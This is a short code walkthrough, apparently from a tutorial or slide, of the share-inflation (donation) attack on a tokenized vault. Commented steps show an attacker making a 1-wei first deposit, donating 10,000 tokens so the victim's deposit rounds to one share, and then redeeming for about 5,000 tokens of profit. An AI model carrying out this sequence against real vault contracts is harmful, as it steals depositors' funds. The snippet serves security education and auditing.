vault.deposit(1, attacker);
// shares = 1 (1:1 for first deposit)
// totalSupply = 1
// totalAssets = 1

// Direct transfer (donation)
token.transfer(
  address(vault),
  10_000e18
);
// totalAssets = 10000e18 + 1
// totalSupply = 1 (unchanged!)

// shares = deposit * totalSupply
//          / totalAssets
// shares = 19999e18 * 1
//          / (10000e18 + 1)
// shares = 1 (rounds DOWN!)
// LOST: ~10,000 tokens!

vault.redeem(
  1, attacker, attacker
);
// assets = 1 * 29999e18 / 2
// assets = ~14,999.5 tokens
// Profit: ~5,000 tokens! 💰

vault.redeem(
  1, victim, victim
);
// Gets: ~15,000 tokens
// Deposited: 19,999 tokens
// LOSS: ~5,000 tokens ⚠️
